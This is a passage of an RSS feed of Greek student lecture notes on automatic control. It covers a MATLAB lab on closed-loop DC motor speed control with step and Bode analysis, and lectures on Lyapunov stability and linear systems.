<guid>posts/lectures/auth/sae1/lec_SAE1_lab2-matlab.html</guid>
<description>
<![CDATA[<p>
Σύστημα κλειστού βρόχου ίδιου τύπου με την προηγούμενη φορά μόνο που έχει
προστεθεί μοναδιαία αρνητική ανάδραση
</p>

\begin{equation}
\label{eq:1}
HT(s) = \frac{2.92(s+440)}{s+12.064}
\end{equation}

\begin{equation}
\label{eq:2}
HV(s) = \frac{18.69}{s+12.064}
\end{equation}
<div id="outline-container-org89254c2" class="outline-2">
<h2 id="org89254c2"><span class="section-number-2">1.</span> <a href="#org89254c2">Προδιαγραφές.</a></h2>
<div class="outline-text-2" id="text-1">
<p>
Ώστε να προσδιορίσουμε κατάλληλα τον ελεγκτή k
</p>

<ol class="org-ol">
<li>Μηδενική υπερύψψση για τις στροφές \(\omega(t),\Omega(s)\)</li>
</ol>
<p>
2 Σφάλμα μόνιμης κατάστασης θέσης μηδενικό για το ΣΚΒ:. 
</p>
\begin{equation}
\label{eq:3}
e_{ss} = 0, \omega_{\delta,ss} = V
\end{equation}
<ol class="org-ol">
<li>Χρόνος ανόδου \(t_a \leq 160ms\)</li>
<li>Τάση διέγερσης \(v_a(t) \leq 350V\)</li>
<li>\(V=150V\)</li>
<li>\(\omega_{\delta,max} = 200rad/sec\)</li>
</ol>
</div>
<div id="outline-container-orge8d3268" class="outline-3">
<h3 id="orge8d3268"><span class="section-number-3">1.1.</span> <a href="#orge8d3268">Προδιαγραφή του \(v_a\)</a></h3>
<div class="outline-text-3" id="text-1-1">
<p>
Πρέπει ανεξαρτήτως εισόδου \(v_a \leq 350V\)
</p>

\begin{equation}
\label{eq:4}
v_a = (v-\omega)*k = e_{max}*k \Rightarrow \cdots k\leq 1.75
\end{equation}
</div>
</div>
</div>
<div id="outline-container-orga12873e" class="outline-2">
<h2 id="orga12873e"><span class="section-number-2">2.</span> <a href="#orga12873e">Συνάρτηση μεταφοράς κλειστού βρόχου</a></h2>
<div class="outline-text-2" id="text-2">
<p>
Από την αρχή της επαλληλίας, παίρνοντας $T<sub>L</sub> = 0$$
</p>

\begin{equation}
\HV_k(s) = \frac{18.69k}{s + (12.064 + 18.69k)}
\end{equation} 

<p>
Οπότε παρατηρούμε πως ο πόλος του closed loop μετακινείται προς τα αριστερα. Δεν
 μένει δηλαδή στο -12. Είναι καλό αυτό (γιατί?). Βέβαια δεν μπορεί να πάει πολύ
 πιο αριστερά λόγω των προδιαγραφών.
</p>
</div>
</div>
<div id="outline-container-org2958ec3" class="outline-2">
<h2 id="org2958ec3"><span class="section-number-2">3.</span> <a href="#org2958ec3">Σφάλμα Θέσης</a></h2>
<div class="outline-text-2" id="text-3">
<p>
Από την θεωρία γνωρίζουμε πως:
</p>

\begin{equation}
\e_{ssp} = \frac{1}{1+k_p} = \frac{12.064}{12.064+128.69k} \neq 0
\end{equation}

<p>
Επομένως, όσο αυξάνει το κέρδος μειώνεται το σφάλμα στην μόνιμη
κατάσταση.
</p>
</div>
</div>
<div id="outline-container-orge1b65ad" class="outline-2">
<h2 id="orge1b65ad"><span class="section-number-2">4.</span> <a href="#orge1b65ad">Μελέτη με \(k=1.5\)</a></h2>
<div class="outline-text-2" id="text-4">
<p>
Γιατί όμως πήραμε 1.5 και όχι 1.75?
</p>

<div class="org-src-container">
<pre class="src src-matlab">k = 1.5;
nHVK = [18.69*k];
dHVK = [1 12.064+18.69*k];

HVk = tf(nHVK,dHVK)
</pre>
</div>
</div>
</div>
<div id="outline-container-org872f4ac" class="outline-2">
<h2 id="org872f4ac"><span class="section-number-2">5.</span> <a href="#org872f4ac">Closed Loop TF για το \(T\)</a></h2>
<div class="outline-text-2" id="text-5">
<p>
Οι πράξεις εδώ δεν έγιναν θεωρήθηκε δεδομένο
</p>

<div class="org-src-container">
<pre class="src src-matlab">nHTK = -1*[2.92 2.92*440];
dHTK = [1 40.1];

HTk = tf(nHTK,dHTK)
</pre>
</div>
</div>
</div>
<div id="outline-container-orge1f1a65" class="outline-2">
<h2 id="orge1f1a65"><span class="section-number-2">6.</span> <a href="#orge1f1a65">Ανάλυση των ΣΜΚΒ</a></h2>
<div class="outline-text-2" id="text-6">
<p>
Ο πόλος μας πήγε στο -40, ενώ έχουμε ακόμα ένα μηδενικό&#x2026;
</p>
</div>
</div>
<div id="outline-container-orge7f46c8" class="outline-2">
<h2 id="orge7f46c8"><span class="section-number-2">7.</span> <a href="#orge7f46c8">Στροφές κινητήρα</a></h2>
<div class="outline-text-2" id="text-7">
<p>
Απολύτως αναμενόμενα βάση της θεωρίας:
</p>

\begin{equation}
\Omega(s) = HV_k(s)V(s) + HT_k(s)T_L(s)
\end{equation}
</div>
</div>
<div id="outline-container-org67ed5d4" class="outline-2">
<h2 id="org67ed5d4"><span class="section-number-2">8.</span> <a href="#org67ed5d4">Υπολογισμός DC Gains</a></h2>
<div class="outline-text-2" id="text-8">
<p>
Θυμίσου από θεωρία dcgain = Tf(0)
</p>

<div class="org-src-container">
<pre class="src src-matlab">HVk0 = dcgain(HVk)
HTk0 = dcgain(HTk)
essp = 12.064/( 12.064+18.69*k )
</pre>
</div>
</div>
</div>
<div id="outline-container-org79731a0" class="outline-2">
<h2 id="org79731a0"><span class="section-number-2">9.</span> <a href="#org79731a0">Σύγκριση με την μελέτη ανοιχτού βρόχου:</a></h2>
<div class="outline-text-2" id="text-9">
<p>
Παρατηρούμε πως τα dcgain έχουν και στις0δύο περιπτώσεις μεωθεί,
οδηγώντας σε μια μεγαλύτερη μείωση του σφάλματος με είσοδο μοναδιαία
βηματική συνάρτηση.
</p>
</div>
</div>
<div id="outline-container-orgc938071" class="outline-2">
<h2 id="orgc938071"><span class="section-number-2">10.</span> <a href="#orgc938071">Στροφές σε steady state</a></h2>
<div class="outline-text-2" id="text-10">
<p>
Από FVT:
</p>

\begin{equation}
\omega_{\delta,ss} = \lim_{s\to0}s*\Omega(s) = \cdots
\end{equation}

<p>
Στην διαφάνεια 6 φανερώνεται η σύγκριση για ανοιχτό και κλειστό βρόχο.
</p>
</div>
</div>
<div id="outline-container-orgccda50a" class="outline-2">
<h2 id="orgccda50a"><span class="section-number-2">11.</span> <a href="#orgccda50a">Ανάλυση σε matlab</a></h2>
<div class="outline-text-2" id="text-11">
<div class="org-src-container">
<pre class="src src-matlab">figure(3)
step(150*HV)
hold on
step(150*HVk)
</pre>
</div>

<div id="org6b97951" class="figure">
<p><img src="posts/lectures/auth/sae1/course_sae1_images/lab2_01.png" alt="lab2_01.png">
</p>
</div>
</div>
</div>
<div id="outline-container-org6db1cbb" class="outline-2">
<h2 id="org6db1cbb"><span class="section-number-2">12.</span> <a href="#org6db1cbb">Σύγκριση προδιαγραφών OL, CL</a></h2>
<div class="outline-text-2" id="text-12">
<ul class="org-ul">
<li>Rise time -&gt; πτώση από τα 180+ στα 54, υπερκαλύπτοντας τις προδιαγραφες</li>
<li>Settle Time -&gt; από 324+ στα 97</li>
</ul>
</div>
</div>
<div id="outline-container-orgb0c0059" class="outline-2">
<h2 id="orgb0c0059"><span class="section-number-2">13.</span> <a href="#orgb0c0059">Απόκριση στροφών σε κλιμακωτού τύπου φορτίο</a></h2>
<div class="outline-text-2" id="text-13">
<p>
Το γράφω μόνο για ορολογία
Δειγματοληψία του χρόνου απο 0 εως 30 με 10ms sampling time
</p>

<div class="org-src-container">
<pre class="src src-matlab">figure(4);
t = 0 : 0.01 : 30;
uV = 150 * stepfun(t,0);
yV = lsim(HVk, uV, t);

uT = 0.5 * stepfun(t,0) + 0.5 * stepfun(t, 8) + -0.5 * stepfun(t, 22);
yT = lsim(HTk, uT, t);

y = yV + yT;
plot(t, y, t, 20*uT)
</pre>
</div>

<div id="org1016eee" class="figure">
<p><img src="posts/lectures/auth/sae1/course_sae1_images/lab2_03.png" alt="lab2_03.png">
</p>
</div>
</div>
</div>
<div id="outline-container-org7414eb6" class="outline-2">
<h2 id="org7414eb6"><span class="section-number-2">14.</span> <a href="#org7414eb6">Bode HV</a></h2>
<div class="outline-text-2" id="text-14">
<div class="org-src-container">
<pre class="src src-matlab">figure(5)
bode(HV)
hold on;
bode(HVk)
</pre>
</div>


<div id="orga900a75" class="figure">
<p><img src="posts/lectures/auth/sae1/course_sae1_images/lab2_04.png" alt="lab2_04.png">
</p>
</div>
</div>
</div>
<div id="outline-container-orgae7bb58" class="outline-2">
<h2 id="orgae7bb58"><span class="section-number-2">15.</span> <a href="#orgae7bb58">Bode HT</a></h2>
<div class="outline-text-2" id="text-15">
<div class="org-src-container">
<pre class="src src-matlab">figure(6)
bode(HT)
hold on;
bode(HTk)
</pre>
</div>


<div id="org70bd696" class="figure">
<p><img src="posts/lectures/auth/sae1/course_sae1_images/lab2_05.png" alt="lab2_05.png">
</p>
</div>


<div id="org4c9e9f9" class="figure">
<p><img src="posts/lectures/auth/sae1/course_sae1_images/lab2_01.png" alt="lab2_01.png">
</p>
</div>
</div>
</div>
]]>
</description></item>
<item>
<title>Διάλεξη 5(1): Θεωρήματα Lyapunov</title>
<link>posts/lectures/auth/sae2/lec_SAE2_20230317.html</link>
<pubDate>Fri, 17 Mar 2023 00:00:00 +0200</pubDate>
<guid>posts/lectures/auth/sae2/lec_SAE2_20230317.html</guid>
<description>
<![CDATA[<div class="note" id="org05e08e4">
<p>
Το συγκεκριμένο μάθημα απο εδώ και στο εξής θα ακολουθήσει την αρίθμηση 1,2,3
(κλασσική), όμως το 5 εδώ δείχνει πως ουσιαστικά <i>πρέπει</i> να έγιναν 4 διαλέξεις
στις οποίες δεν μπόρεσα να παω τις πρώτες βδομάδες
</p>

</div>
<div id="outline-container-org6a57454" class="outline-2">
<h2 id="org6a57454"><span class="section-number-2">1.</span> <a href="#org6a57454">Εισαγωγή</a></h2>
<div class="outline-text-2" id="text-1">
<p>
Περιορισμός του αντικειμένου του μαθήματος σε γραμμικά συστήματα, δηλαδή σε
συστήματα που περιγράφονται από εξισώσεις της μορφής:
</p>

\begin{equation}
\label{eq:1}
{\dot x} = F(x) \Rightarrow {\dot x} = Ax
\end{equation}

<p>
όπου \(x\) το διάνυσμα καταστάσεων, και \(A\) matrix, όπου:
</p>
<ul class="org-ul">
<li>\(A\) τετραγωνικός πίνακας, όπου αν \(det(A)=0\), από ΓΑ: \(Ax=0\Rightarrow x=0\)</li>
<li>\(x^{*}\): Σημείο ισορροπίας του συστήματος.</li>
</ul>

<p>
Η ευστάθεια υπολογίζεται από τις ιδιοτιμές του πίνακα \(A\):
</p>
<ul class="org-ul">
<li>Αρνητικό πραγματικό μέρος σε <b>όλες</b> τις ιδιοτιμές ενός συστήματος -&gt; ασυμπτωτικά ευσταθές</li>
<li>Αν έστω και μία ιδιοτιμή έχει θετικό πραγματικό μέρος -&gt; ασταθές.</li>

<li>Η ευστάθεια είναι χαρακτηριστικό του συστήματος.
<ul class="org-ul">
<li>Μόνο για γραμμικά</li>
<li>Μιλάμε για ευστάθεια συστήματος και όχι σημείου ισορροπίας</li>
</ul></li>
</ul>
</div>
</div>
<div id="outline-container-org532d899" class="outline-2">
<h2 id="org532d899"><span class="section-number-2">2.</span> <a href="#org532d899">Ειδικές περιπτώσεις πίνακα \(A\)</a></h2>
<div class="outline-text-2" id="text-2">
</div>
<div id="outline-container-org30b11de" class="outline-3">
<h3 id="org30b11de"><span class="section-number-3">2.1.</span> <a href="#org30b11de">Διαγώνιος ή τριγωνικός</a></h3>
<div class="outline-text-3" id="text-2-1">
<p>
Αν ο \(A\) διαγώνιος ή τριγωνικός, ως γνωστόν τα στοιχεία της διαγωνίου είναι οι
ιδιοτιμές:
</p>
<ul class="org-ul">
<li>Σε αυτή την περίπτωση προφανώς καθώς:<sup><a id="fnr.1" class="footref" href="#fn.1" role="doc-backlink">1</a></sup></li>
</ul>
\begin{equation}
\label{eq:3}
{\dot x}_j = \lambda_jx_j \Rightarrow \cdots \Rightarrow x_j(t) = x_j(0)e^{\lambda_jt}
\end{equation}

<ul class="org-ul">
<li>Μηδενική ορίζουσα</li>
</ul>
</div>
</div>
<div id="outline-container-org66a72df" class="outline-3">
<h3 id="org66a72df"><span class="section-number-3">2.2.</span> <a href="#org66a72df"><i>Μπλοκ</i> πίνακας</a></h3>
<div class="outline-text-3" id="text-2-2">
\begin{equation}
\label{eq:4}
\begin{bmatrix}
\begin{bmatrix}
\sigma_1 & \omega_1\\
- \omega_1 & \sigma_1\\
\end{bmatrix} & \cdots & 0\\
\vdots & \ddots & \vdots\\
0 & \cdots &
\begin{bmatrix}
\sigma_n & \omega_n\\
- \omega_n & \sigma_n\\
\end{bmatrix} 
\end{bmatrix}
\end{equation}

<p>
Αρχικά έχουμε μιγαδικές ιδιοτιμές της μορφής:
</p>
\begin{equation}
\label{eq:6}
\lambda_j = \sigma_j \pm \jmath \omega_j
\end{equation}

<p>
Ενώ οι ίδιες οι ρίζες του συστήματος:
</p>
\begin{equation}
\label{eq:7}
x_{2j-1}(t) = e^{\sigma_jt}(x_{2j-1}(0)\cos{\left(\omega_jt\right)}+x_{2j}(0)\sin{\left(\omega_jt\right)})
\end{equation}

<p>
Φαίνεται ότι έχουμε ταλάντωση, και πάλι ο εκθετικός όρος είναι ενδεικτικός της
κρισιμότητς του αρνητικού πραγματικού μέρους ως <b>αναγκαστικό</b> στοιχείο για την
ευστάθεια του συστήματος.
</p>
</div>
</div>
</div>
<div id="outline-container-orgbbb206c" class="outline-2">
<h2 id="orgbbb206c"><span class="section-number-2">3.</span> <a href="#orgbbb206c">Παράδειγμα: Εξέταση ευστάθειας&#xa0;&#xa0;&#xa0;<span class="tag"><span class="example">example</span></span></a></h2>
<div class="outline-text-2" id="text-3">
<p>
Έχουμε σύστημα της μορφής:
</p>
\begin{equation}
\label{eq:8}
{\dot x} = 
\begin{bmatrix}
-k_0 -k_1 & k_1\\
k_2 & -k_2
\end{bmatrix}x + 
\begin{bmatrix}
b_0\\0
\end{bmatrix}u
\end{equation}

<p>
Θέλουμε να σχεδιάσουμε ελεγκτή ο οποίος να εξαρτάται μόνο από την έξοδο και να
εξασφαλίζει ότι εκείνη θα οδηγείται στο 0.
</p>

<p>
Θέλουμε να χρησιμοποιήσουμε ένα γενικό ελεγκτή της μορφής:
</p>
\begin{equation}
\label{eq:9}
u = -kx_2
\end{equation}

<div class="note" id="orgfe62360">
<p>
Γραμμική ανάδραση <i>μεταβολής</i> 
</p>

</div>

<p>
Αντικαθιστώντας στην \(\ref{eq:8}\), έχουμε:
</p>
\begin{equation}
\label{eq:10}
{\dot x} = 
\begin{bmatrix}
-k_0 -k_1 & k_1\\
k_2 & -k_2
\end{bmatrix}x + 
\begin{bmatrix}
-b_0kx_{2}\\0
\end{bmatrix}
\end{equation}


<p>
Και όμορφα, συνδυάζοντας τα σε έναν μόνο πίνακα:
</p>
\begin{equation}
\label{eq:11}
{\dot x} = 
\begin{bmatrix}
-k_0 -k_1 & k_1-kb_0\\
k_2 & -k_2
\end{bmatrix}x \Rightarrow
{\dot x} = Ax
\end{equation}


<p>
Καθώς όλα τα στοιχεία μεγαλύτερα του 0 (\(k_i >0\)):
</p>
\begin{equation}
\label{eq:12}
det(A) = \cdots > 0
\end{equation}

<p>
Που σημαίνει ότι ο πίνακας \(A\) έχει βαθμό 2, οπότε και συνεχίζουμε υπολογίζοντας
τις ιδιοτιμές:
</p>
\begin{equation}
\label{eq:13}
det(sI - A) = 0 \Rightarrow \cdots \Rightarrow  s^2+ (k_0+k_1+k_2)s + k_2(b_0k+k_0) = 0
\end{equation}

<p>
Η ευστάθεια σε αυτό το σημείο μπορεί να εκτιμηθεί με 2 τρόπους:
</p>
<ul class="org-ul">
<li>Τρόπος 1: Κλασσικός με διακρίνουσα.
Λύνεις την εξίσωση και βγάζεις τις ιδιοτιμές συναρτήσει των \(k_{i}, b_0\). Σε
αυτή την φάση, απλά ενδιαφερόμαστε για να έχουν αρνητικό πραγματικό μέρος,
οπότε περιορίζεις τις επιλογές αντίστοιχα</li>
<li>Τρόπος 2: Κριτήριο Routh.
Αντί να παιδεύεσαι να λύνεις εξισώσεις, που μπορεί (αρκετά συχνά) να είναι πιο
δύσκολες από αυτές που εξετάζονται σε αυτό το παράδειγμα, εφαρμόζεις το
κριτήριο Routh, όπως αυτό έχει <i>καλυφθεί</i> στα ΣΑΕ1 (δεν υπάρχει στο υλικό που
είναι ανεβασμένο, υπάρχει όμως λινκ για τις σημειώσειες Κανναβούρα).
<ul class="org-ul">
<li>Αρκεί (μόνο για 2ο βάθμια συστήματα): να είναι όλοι οι όροι ομόσημοι του
μεγιστοβάθμιου.</li>
</ul></li>
</ul>
</div>
</div>
<div id="outline-container-org122895e" class="outline-2">
<h2 id="org122895e"><span class="section-number-2">4.</span> <a href="#org122895e">Θεωρήματα Lyapunov</a></h2>
<div class="outline-text-2" id="text-4">
<p>
Στα μη γραμμικά συστήματα η ανάλυση ευστάθειας γίνεται με δύο κυρίως τρόπους:
</p>
</div>
<div id="outline-container-org5a0749e" class="outline-3">
<h3 id="org5a0749e"><span class="section-number-3">4.1.</span> <a href="#org5a0749e">Έμμεση μέθοδος ευστάθειας</a></h3>
<div class="outline-text-3" id="text-4-1">
<div class="note" id="orgf5a9571">
<p>
Επί του θεωρήματος. Με το εξεταζόμενο θεώρημα (πρώτο θεώρημα του
<a href="https://en.wikipedia.org/wiki/Aleksandr_Lyapunov">Lyapunov</a>) ελέγχουμε μόνο
κοντά σε εκείνη την περιοχή
</p>

</div>
<p>
Ισοδύναμα, το πρώτο θεώρημα του Lyapunov.
</p>

<p>
Δοθέντος συστήματος που περιγράφεται από την:
</p>
\begin{equation}
\label{eq:14}
{\dot x} = F(x)
\end{equation}

<p>
Αν ένα σημείο ισορροπίας είναι το \(x^{*}\):
</p>
\begin{equation}
\label{eq:15}
{\dot x} = F(x^{*}) + \frac{\partial{F}}{\partial{x}}(x-x^{*})+ R(|x-x^{*}|)
\end{equation}

<p>
Αν το \(x^{*}\), επαρκώς κοντά στο \(x\), τότε οι τελευταίοι πίνακες εξαφανίζονται
καθώς αποκτούν απειροελάχιστη τιμή τελικά έχουμε:
</p>

\begin{equation}
\label{eq:16}
{\dot x} = A (x-x^{*}) \Rightarrow {\dot x} = Az
\end{equation}

<p>
Αλλάζω μεταβλητή ώστε να είναι στην μορφή που έχουμε συνηθίσει να μελετάμε τα
συστήματα. Για την καινούρια μεταβλητή ισχύει:
</p>

\begin{equation}
\label{eq:17}
z^{\cdot} = {\dot x}
\end{equation}
</div>
<div id="outline-container-orgbc7edc6" class="outline-4">
<h4 id="orgbc7edc6"><span class="section-number-4">4.1.1.</span> <a href="#orgbc7edc6">Φυσικό παράδειγμα εκκρεμούς&#xa0;&#xa0;&#xa0;<span class="tag"><span class="example">example</span></span></a></h4>
<div class="outline-text-4" id="text-4-1-1">
\begin{equation}
\label{eq:19}
{\dot x} = 
\begin{bmatrix}
x_2 \\ \sin{\left(x_1\right)} - \gamma x_2
\end{bmatrix}
, \gamma>0
\end{equation}

<p>
Τα σημεία ισορροπίας έχουν βρεθεί σε προηγούμενη άσκηση:
</p>
\begin{equation}
\label{eq:20}
(0,0), (\pi,0)
\end{equation}

<p>
(Μπορούν εύκολα να βγουν βέβαια και από την λογική μας αντίληψη. Το εκκρεμές
έχει ένα σημείο ισορροπίας στην κορυφή, το οποίο όμως είναι ασταθές, και ένα που
είναι ευσταθές στο κατώτερο σημείο της τροχιάς του.)
</p>

<p>
Πρέπει να βγάλουμε ξεχωριστή μελέτη για κάθε σημείο ισορροπίας. Προκειμένου να
είναι ευσταθές το σύστημα, θα πρέπει να είναι ευσταθές σε κάθε σημείο
ισορροπίας(?).
</p>
</div>
<ol class="org-ol">
<li><a id="org8071e45"></a><a href="#org8071e45">Εξετάζοντας το πρώτο σημείο</a><br>
<div class="outline-text-5" id="text-4-1-1-1">
<ul class="org-ul">
<li>Για μικρές γωνίες: \(\sin{\left(x_1\right)}\approx x_1\), οπότε και να κάνω την
αντικατάσταση επί του πίνακα:</li>
</ul>

\begin{equation}
\label{eq:21}
{\dot x} = 
\begin{bmatrix}
x_2 \\ x_1 - \gamma x_2
\end{bmatrix}
\end{equation}

<p>
Το οποίο φέρνοντας το στην κατάλληλη μορφή \({\dot x} = A x\):
</p>

\begin{equation}
\label{eq:22}
{\dot x} = 
\begin{bmatrix}
0 & 1\\ 1 & -\gamma
\end{bmatrix}
x
\end{equation}

<p>
Είναι προφανές ότι :
</p>
\begin{equation}
\label{eq:23}
\det(sI - A) = 0 \Rightarrow s^2 + \gamma s -1 = 0
\end{equation}

<p>
Από <a href="#orgbbb206c">το σχόλιο για την εφαρμογή του Routh σε δευτεροβάθμια εξίσωση</a> το σύστημα δεν
είναι ευσταθές σε αυτό το σημείο ισορροπίας.
</p>
</div>
</li>
<li><a id="org62e750d"></a><a href="#org62e750d">Εξετάζοντας το δεύτερο σημείο</a><br>
<div class="outline-text-5" id="text-4-1-1-2">
<div class="note" id="org6f081d9">
<p>
Αν το σημείο ισορροπίας είναι το 0, καλώς. Αν όχι χρειάζεται να κάνουμε αλλαγή
μεταβλητής της μεταβλητής: \(z = x- x^{*}\). Αυτό είναι επιτρεπτό χωρίς βλάβη της γενικότητας.
</p>

</div>
<p>
Για το δεύτερο σημείο, προκειμένου να κάνω την ίδια ανάλυση, <b>χρειάζεται να θέσω
μεταβλητή</b> ώστε το εξεταζόμενο σημείο ισορροπίας (στην καινούρια μεταβλητή) να
είναι το 0.
</p>

\begin{equation}
\label{eq:24}
z = 
\begin{bmatrix}
z_1\\z_2
\end{bmatrix} = 
\begin{cases}
z_1 &=  x_1 - \pi\\
z_2 &= x_2\\
\end{cases}
\end{equation}

<p>
Οπότε, όπως δείχνει η \(\ref{eq:22}\)
</p>
\begin{equation}
\label{eq:69}
{\dot z} =
\begin{bmatrix}
z_2 & 0 \\
 \sin{\left(z_1+\pi\right)} &-\gamma z_2
\end{bmatrix}
\end{equation}

<p>
(Θέλουμε πάλι να κάνουμε προσέγγιση):
</p>
\begin{equation}
\label{eq:26}
\sin{\left(z_1+\pi\right)} = - \sin{\left(z_1\right)} \stackrel{\text{around } 0}{\approx} - z_{1}
\end{equation}

<p>
Έτσι:
</p>
\begin{equation}
\label{eq:25}
{\dot z} = 
\begin{bmatrix}
0 & 1\\ -1 & -\gamma
\end{bmatrix}z
\end{equation}

<p>
Και, με την ίδια διαδικασία καταλήγουμε:
</p>

\begin{equation}
\label{eq:27}
\det(sI - A) = 0 \Rightarrow s^2 +\gamma s +1 = 0
\end{equation}

<p>
οπότε το συγκεκριμένο σημείο ισορροπίας είναι ευσταθές.
</p>

<p>
Το σύστημα, όμως, γενικά δεν είναι ευσταθές (?) - Δεν θα έπρεπε να είναι?.
</p>
</div>
</li>
</ol>
</div>
</div>
<div id="outline-container-orgcad4bee" class="outline-3">
<h3 id="orgcad4bee"><span class="section-number-3">4.2.</span> <a href="#orgcad4bee">Αναγκαίος ορισμός: Θετικά/Αρνητικά ορισμένη συνάρτηση</a></h3>
<div class="outline-text-3" id="text-4-2">
<p>
Οριζουμε συνάρτηση: \(V: {\mathbb R}^n \to {\mathbb R}\). Εκείνη ονομάζεται θετικά
ορισμένη αν και μόνο αν:
</p>
\begin{equation}
\label{eq:29}
V(x) > 0 \forall x\neq 0
\end{equation}
<p>
ΚΑΙ
</p>
\begin{equation}
\label{eq:30}
V(0) = 0
\end{equation}

<p>
Αντίστοιχα, αρνητικά ορισμένη αν αντιστρέφεται η πρώτη σχέση \(\ref{eq:29}\):
</p>
\begin{equation}
\label{eq:18}
V(x)<0 \forall x \neq 0
\end{equation}
</div>
<div id="outline-container-org7176986" class="outline-4">
<h4 id="org7176986"><span class="section-number-4">4.2.1.</span> <a href="#org7176986">Προσοχή στον ορισμό&#xa0;&#xa0;&#xa0;<span class="tag"><span class="example">example</span></span></a></h4>
<div class="outline-text-4" id="text-4-2-1">
<p>
Έστω ότι έχουμε αυτές τις δύο συναρτήσεις, και θέλουμε
</p>
\begin{align*}
\label{eq:31}
V_1(x_1,x_2) &= x_1^2 + x_2^2\\
V_2(x_1,x_2) &= x_1^{2}
\end{align*}
<p>
Απο αυτές τις δύο ποιά είναι θετικά ορισμένη?
</p>

<p>
Μόνο η \(V_1\).
Η \(V_2\) είναι θετικά <b>ήμι</b> ορισμένη&#x2026;
</p>
</div>
</div>
</div>
<div id="outline-container-org01b2c2b" class="outline-3">
<h3 id="org01b2c2b"><span class="section-number-3">4.3.</span> <a href="#org01b2c2b">Άμεση μέθοδος ευστάθειας</a></h3>
<div class="outline-text-3" id="text-4-3">
<p>
Δεύτερο θεώρημα του Lyapunov.
</p>
<div class="note" id="org41f38fa">
<p>
Πηγή: <a href="https://helit.org/ece-notes/sae2.pdf">https://helit.org/ece-notes/sae2.pdf</a>, σελίδα 27.
</p>

</div>

<p>
Έστω <i>κλασσικά</i> σύστημα της μορφής:
</p>
\begin{equation}
\label{eq:28}
{\dot x} = F(x)
\end{equation}
<p>
και σημείο ισορροπίας \(x^{*}\)
</p>

<p>
Έστω θετικά ορισμένη συνάρτηση, την οποία και ονομάζουμε συνάρτηση Lyapunov 
</p>
\begin{equation}
\label{eq:33}
V(x) >0
\end{equation}

<p>
Αν δείξουμε ότι εντός της σφαίρας:
</p>
\begin{equation}
\label{eq:34}
B_r(0) = \left\{ x\in {\mathbb R}^n : |x| < r\right\}
\end{equation}

<p>
Η συνάρτηση
</p>
\begin{equation}
\label{eq:32}
{\dot V} = \frac{\partial{V}}{\partial{x}}^T {\dot x} = \frac{\partial{V}}{\partial{x}}^T F(x) 
\end{equation}

<ul class="org-ul">
<li>Αρνητικά ημιορισμένη: το \(x=0\) ευσταθές σημείο ισορροπίας</li>
<li>Αρνητικά ορισμένη: το \(x=0\) είναι τοπικά ασυμπτωτικά ευσταθές</li>
</ul>
</div>
</div>
</div>
<div id="footnotes">
<h2 class="footnotes">Footnotes: </h2>
<div id="text-footnotes">

<div class="footdef"><sup><a id="fn.1" class="footnum" href="#fnr.1" role="doc-backlink">1</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
Άρα εδώ φαίνεται ότι δεν έχουμε μόνο ασυμπτωτική αλλά και εκθετική
ευστάθεια/αστάθεια - ανάλογα με το πρόσημο του \(\lambda_j\), όπως άλλωστε
φαίνεται και από την εξίσωση \(\ref{eq:3}\). 
</p></div></div>


</div>
</div>]]>
</description></item>
<item>
<title>Διάλεξη 2: Ευστάθεια με διαγωνιοποίηση</title>
<link>posts/lectures/auth/sae2/lec_SAE2_20230329.html</link>
<pubDate>Wed, 29 Mar 2023 00:00:00 +0300</pubDate>
<guid>posts/lectures/auth/sae2/lec_SAE2_20230329.html</guid>
<description>
<![CDATA[<div id="outline-container-orgb8b84aa" class="outline-2">
<h2 id="orgb8b84aa"><span class="section-number-2">1.</span> <a href="#orgb8b84aa">Εισαγωγή</a></h2>
<div class="outline-text-2" id="text-1">
<ul class="org-ul">
<li>Γιατί εξετάζουμε γραμμικά συστήματα ενώ όλα τα πραγματικά είναι μη γραμμικά;
<ol class="org-ol">
<li>Προσομοίωση/προσέγγιση μη γραμμικού συστήματος σε μια αυστηρά ορισμένη
περιοχή λειτουργίας.</li>
<li>Καλύτερη <i>αίσθηση ελέγχου.</i> Ουσιαστικά αντιλαμβανόμαστε καλύτερα τα γραμμικά
συστήματα.</li>
<li>Ευκολότερη ερευνητική μελέτη: όσο πιο απλό είναι το εξεταζόμενο αντικείμενο
τόσο πιο εύκολα μπορεί να περιγραφεί και να αναλυθεί από τους όποιους μελετητές.</li>
</ol></li>
</ul>
</div>
</div>
<div id="outline-container-org9e7a021" class="outline-2">
<h2 id="org9e7a021"><span class="section-number-2">2.</span> <a href="#org9e7a021">Εξέταση γραμμικής φύσεως συστήματος</a></h2>
<div class="outline-text-2" id="text-2">

<div id="org867c98b" class="figure">
<p><img src="posts/lectures/auth/sae2/course_sae2_images/230329_1408_lec2-sample-system.png" alt="230329_1408_lec2-sample-system.png">
</p>
<p><span class="figure-number">Figure 1: </span>Βασικό και καλά σχεδιάγραμμα του εξεταζόμενου συστήματος.</p>
</div>

<p>
Έστω το δοθέν σύστημα
</p>

\begin{equation}
\label{eq:1}
{\dot x} = f(x,u)
\end{equation}

\begin{equation}
\label{eq:2}
y = h(x,u)
\end{equation}

<p>
όπου έχουμε \(x\in {\mathbb R}^n, u\in {\mathbb R}^m, y\in {\mathbb R}^p\)
</p>


<p>
Το σύστημα θα λέγεται γραμμικό (σε κάποια περιοχή) αν μπορεί να περιγραφεί από
εξισώσεις της μορφής:
</p>
\begin{align}
\label{eq:3}
{\dot x} &= Ax + Bu \\
y &= Cx + Du
\end{align}

<p>
Ουσιαστικά η συγκεκριμένη ενότητα έχει αναλυθεί (μερικώς) στα μαθήματα των
κυκλωμάτων: Αρχές της ομογένειας και της επαλληλίας &#x2026;
</p>

<p>
Πιο αυστηρά, προκειμένου το σύστημα γραμμικό θα πρέπει να ισχύουν οι τρεις
παρακάτω ιδιότητες:
</p>
</div>
<div id="outline-container-org12d3bc2" class="outline-3">
<h3 id="org12d3bc2"><span class="section-number-3">2.1.</span> <a href="#org12d3bc2">Ιδιότητα 1</a></h3>
<div class="outline-text-3" id="text-2-1">
\begin{equation}
\label{eq:4}
y(t; ax_1+ bx_2,0) = ay(t;x_1,0) + b y(t; x_2,0)
\end{equation}

<div class="note" id="org897ba7b">
<p>
Όπου ο συμβολισμός που υιοθετείται στις  \(\ref{eq:4}\)  \(\ref{eq:6}\)  \(\ref{eq:7}\)
</p>
\begin{equation}
\label{eq:5}
y(\text{time};\text{initial value}, \text{input value})
\end{equation}
<p>
η ισοδύναμα:
</p>
\begin{equation}
\label{eq:8}
y(t; x,u)
\end{equation}

</div>
</div>
</div>
<div id="outline-container-org10fdbc2" class="outline-3">
